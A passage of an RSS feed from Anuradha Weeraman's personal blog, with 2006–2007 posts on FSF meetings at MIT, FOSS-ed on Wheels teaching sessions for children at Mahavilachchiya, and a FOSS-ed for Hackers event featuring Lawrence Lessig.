+<p>Just as I expected, I <a href="http://flickr.com/photos/aweeraman/433037519/" target="_blank" rel="noopener noreferrer">bumped into Niibe</a> this year as well, and we caught up on some of the Debian work that I’ve been doing with him. Niibe is my mentor at Debian and has been helping me immensely to get my packages into Debian.</p>
+<p>Other notable attendees were <a href="http://en.wikipedia.org/wiki/Bruce_Perens" target="_blank" rel="noopener noreferrer">Bruce Perens</a> and <a href="http://thunk.org/tytso/" target="_blank" rel="noopener noreferrer">Ted Ts’o</a>.</p>
+<p>I noticed Ted when he entered the room, towards the latter part of the event. It was only later that I found out that he was to receive the FSF Award for the Advancement of Free software. I didn&#x27;t expect to see any high profile kernel hackers as himself at FSF events although there was one attendee who was the splitting image of <a href="http://en.wikipedia.org/wiki/Alan_Cox" target="_blank" rel="noopener noreferrer">Alan Cox</a>, but a little poking round revealed that to be a false lead.</p>
+<p>The presentation by <a href="http://en.wikipedia.org/wiki/Benjamin_Mako_Hill" target="_blank" rel="noopener noreferrer">Mako Hill</a> on &quot;Defining Free Culture&quot; was quite informative on some of the <a href="http://freedomdefined.org/Definition" target="_blank" rel="noopener noreferrer">good work</a> he&#x27;s been upto lately. <a href="http://en.wikipedia.org/wiki/Eben_Moglen" target="_blank" rel="noopener noreferrer">Eben Moglen</a>&#x27;s oratory was impressive as always and <a href="http://en.wikipedia.org/wiki/Gerald_Sussman" target="_blank" rel="noopener noreferrer">Gerald Sussman</a> confounded the audience with some deep mathematics. <a href="http://en.wikipedia.org/wiki/Richard_stallman" target="_blank" rel="noopener noreferrer">RMS</a> spoke on software patents.</p>
+<p>Some photos from the event are available on <a href="http://flickr.com/photos/aweeraman/sets/72157600025161611/" target="_blank" rel="noopener noreferrer">my flickr</a>.</p>
+<p>Past events: <a href="http://anuradha.wordpress.com/2006/04/06/rms-mit/" target="_blank" rel="noopener noreferrer">FSF Members Meeting, 2006</a></p></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>Mahavilachchiya — day two</title>
+      <link>https://weeraman.com/mahavilachchiya-day-two</link>
+      <guid isPermaLink="true">https://weeraman.com/mahavilachchiya-day-two</guid>
+      <pubDate>Sun, 22 Oct 2006 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[Yesterday was the second day of the FOSS-ed on Wheels at Mahavilachchiya. The kids were some of the brightest I've met and they pick things up in a flash.]]></description>
+      <media:content url="https://weeraman.com/images/mahavilachchiya-day-two/mahavilachchiya-classroom.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/mahavilachchiya-day-two/mahavilachchiya-classroom.jpg" alt="Mahavilachchiya — day two" /></figure><div><p>Yesterday was the second day of the FOSS-ed on Wheels at Mahavilachchiya.</p>
+<p>The kids were some of the brightest I’ve met and they pick things up in a flash. The night before, I did a programming primer to a group of lads and lasses, 18 years old on average. The girls outnumbered the guys by a scary margin, approximately 10 girls and 2 guys. References to <a href="http://en.wikipedia.org/wiki/Ada_lovelace" target="_blank" rel="noopener noreferrer">Ada Lovelace</a> and <a href="http://www.agnesscott.edu/LRIDDLE/WOMEN/hopper.htm" target="_blank" rel="noopener noreferrer">Grace Mary Hopper</a> were made in the hope of striking an inspiration. We can begin to hope for better gender distribution in the coming years for IT.</p>
+<p>Woke up in the morning feeling a little stiff, but a bit of photographing around the perimeter did the trick. I brought T’s D50 with me, along with the 10x zoom lens and the array of filters, and that’s always fun to play around with.</p>
+<p>Had a session with the younger kids in the afternoon and my voice kept getting drowned by the patter of rain on the roof. Like a cornered prey, I decided to do the rest of the talk in the middle of the room surrounded by the kids. That was an experience. We talked about how computers spoke to each other. This was the first time I got in front of such a young crowd and it was an enlightening experience.</p>
+<p>While wrapping up, seven (or eight) year old Asela came over to shake my hand and say goodbye. That was probably the hightlight of the show, and made everything worth it.</p>
+<p>This FOSS-ed has been a unique experience for me, and very different from the other FOSS-eds I’ve been involved with. I think it’s a good trend that FOSS is moving away from Colombo to places where it really matter. The future looks bright.</p>
+<p>Also, I must commend the effort of Wanni which I think is phenomenally successful. We need more like him to do what he has done in other places with the same level of selflessness and dedication. For those who might not know, Nandasiri Wanninayaka (aka Wanni) is the founder of the <a href="http://www.horizonlanka.org/" target="_blank" rel="noopener noreferrer">Horizon Lanka Foundation</a>.</p>
+<p>Update: Some photographs from the event can be found <a href="http://www.flickr.com/photos/aweeraman/sets/72157594341258104/" target="_blank" rel="noopener noreferrer">here </a>and <a href="http://www.flickr.com/photos/aweeraman/sets/72157594341261480/" target="_blank" rel="noopener noreferrer">here</a>.</p></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>From Mahavilachchiya, with love</title>
+      <link>https://weeraman.com/from-mahavilachchiya-with-love</link>
+      <guid isPermaLink="true">https://weeraman.com/from-mahavilachchiya-with-love</guid>
+      <pubDate>Sat, 21 Oct 2006 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[I'm at Mahavilachchiya right now, at the Horizon Lanka Foundation, with the FOSS-ed on Wheels troupe. So far the experience has been breathtaking.]]></description>
+      <media:content url="https://weeraman.com/images/from-mahavilachchiya-with-love/mahavilachchiya-children.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/from-mahavilachchiya-with-love/mahavilachchiya-children.jpg" alt="From Mahavilachchiya, with love" /></figure><div><p>I’m at <a href="http://mahavilachchiya.net/" target="_blank" rel="noopener noreferrer">Mahavilachchiya</a> right now, at the <a href="http://www.horizonlanka.org/" target="_blank" rel="noopener noreferrer">Horizon Lanka Foundation</a>, with the FOSS-ed on Wheels troupe. So far the experience has been breathtaking.</p>
+<p>Yesterday, we were at the Kekirawa Central College where we talked to a group of individuals eager to learn about FOSS. This group was very diverse, from teachers to school students, equally eager to try new tricks. I spoke to a group of students during a small break and since then I’ve been repeatedly telling everyone how great those kids were. One in particular, was an extremely enthusiastic lad and I kept wishing I could do more to help these kids.</p>
+<p>Horizon Lanka Foundation is running a school here, in a very organized fashion. One of the first things we saw when we entered the premises was a large group of students organized neatly in ranks, all wearing yellow uniforms and looking very subdued. I was able to mingle easily with the students in my matching yellow t-shirt. Nobody believed my exclaims of coincidence.</p></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>FOSS-ed for Hackers, a footnote</title>
+      <link>https://weeraman.com/foss-ed-for-hackers-a-footnote</link>
+      <guid isPermaLink="true">https://weeraman.com/foss-ed-for-hackers-a-footnote</guid>
+      <pubDate>Tue, 30 May 2006 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[FOSS-ed for Hackers ended last week, and the entire geek blogosphere has been brimming with posts on the subject so I won't delve much into it. Overall, it was a success.]]></description>
+      <media:content url="https://weeraman.com/images/foss-ed-for-hackers-a-footnote/creative-commons-open-source.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/foss-ed-for-hackers-a-footnote/creative-commons-open-source.jpg" alt="FOSS-ed for Hackers, a footnote" /></figure><div><p><a href="http://www.foss.lk" target="_blank" rel="noopener noreferrer">FOSS-ed for Hackers</a> ended last week, and the entire geek blogosphere has been brimming with posts on the subject so I won’t delve much into it. Overall, it was a success. The participation was extremely good and the event was organized in style, thanks largely to Devaka.</p>
+<p>The appearance of Lawrence Lessig, founder of Creative Commons was definitely the highlight of the show, and he did a very interesting talk that had me captivated. As usual, there was a lot of bumping into old friends and catching up, as it is common at events of this nature where geeks congregate.</p>
+<p>Being the undisputed king of procrastination and, when the mood strikes, bad hair day, I waited until the last moment to finish my presentation, and just barely managed to cobble together the slides in time. Despite my grievances, I managed to complete the presentation with just a few cringe-worthy moments. Thankfully, I got a couple of good questions from the crowd during the Q&amp;A session that just went to prove, despite my views to the contrary, that everybody in fact was NOT sleeping. You can find the slides <a href="http://www.linux.lk/~anu/presentations/perl_gtk.pdf" target="_blank" rel="noopener noreferrer">here</a>.</p>
+<p>On a slightly different note, I was somewhat disappointed in the mole that I planted in the crowd to ask intelligent questions when the time came to relieve tension and get the questions flowing. As anticipated, the mole failed to deliver and is now expected to refund the downpayment at earliest convenience.</p></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>RMS @ MIT</title>
+      <link>https://weeraman.com/rms-mit</link>
+      <guid isPermaLink="true">https://weeraman.com/rms-mit</guid>
+      <pubDate>Thu, 06 Apr 2006 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[It was a very eventful weekend. For one thing, the FSF associate member's meeting was being held at MIT on Saturday. I'm not a fan of social events, but as it turns out, geek hangouts are where I thrive.]]></description>
+      <media:content url="https://weeraman.com/images/rms-mit/rms-mit-cover.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/rms-mit/rms-mit-cover.jpg" alt="RMS @ MIT" /></figure><div><p>It was a very eventful weekend. For one thing, the FSF associate member’s meeting was being held at MIT on Saturday. I’m not a fan of social events, but as it turns out, geek hangouts are where I thrive. Made the long and arduous journey to Boston with Supun, a colleague of mine and a free software aficionado, and took the subway to Kendall/MIT. It was a very pleasant day, perfect for some good ol’ curbside hackin’.</p>
+<p>The turn out at the meeting was pretty good, and there were some FSF merchandise right outside and I promptly bought a couple of books. Scanning the lounge for familiar faces, I quickly noticed <a href="http://www.linux.lk/~anu/gallery/rms_at_mit/dsc00423.jpg.html" target="_blank" rel="noopener noreferrer">Niibe</a> walking over. Niibe came over to Sri Lanka and participated in a <a href="http://www.asia-oss.org/sep2005/materials/wg/CodeFest.pdf" target="_blank" rel="noopener noreferrer">Code Fest held at Virtusa</a> as part of the sixth Asia Open Source Symposium. Niibe is well known for his efforts on the Linux kernel SuperH port.</p>
+<p>One of the speakers was the venerable MIT professor <a href="http://en.wikipedia.org/wiki/Gerald_Jay_Sussman" target="_blank" rel="noopener noreferrer">Gerald Jay Sussman</a>, who invented the <a href="http://www.schemers.org/" target="_blank" rel="noopener noreferrer">Scheme programming language</a> along with Guy Steele Jr, one of his former students. It was a very interesting talk titled “Software is never finished”.</p>
+<p><a href="http://en.wikipedia.org/wiki/Eben_Moglen" target="_blank" rel="noopener noreferrer">Eben Moglen</a> followed soon afterwards, followed by <a href="http://en.wikipedia.org/wiki/Richard_Stallman" target="_blank" rel="noopener noreferrer">Richard Stallman</a>. RMS spoke about the evils of DRM and the new provisions introduced to counter it in GPLv3.</p>
+<p>After the presentation, I managed to have a little chat with him in the lounge area, and when I mentioned the LKLUG he was quick to point out that a name change was in order. You can trust RMS not to miss that one. There was a long and heated LKLUG mail thread on this same issue way back in 2004. Thanks to lurker, I’ve managed to <a href="http://www.lug.lk/lurker/message/20040323.154440.6466f514.en.html" target="_blank" rel="noopener noreferrer">dig it up</a>.</p>
+<p>Some photographs of the event <a href="http://www.linux.lk/~anu/gallery/rms_at_mit/dsc00393.jpg.html" target="_blank" rel="noopener noreferrer">can be found here</a>.</p></div>]]></content:encoded>
+    </item>
+  </channel>
+</rss>
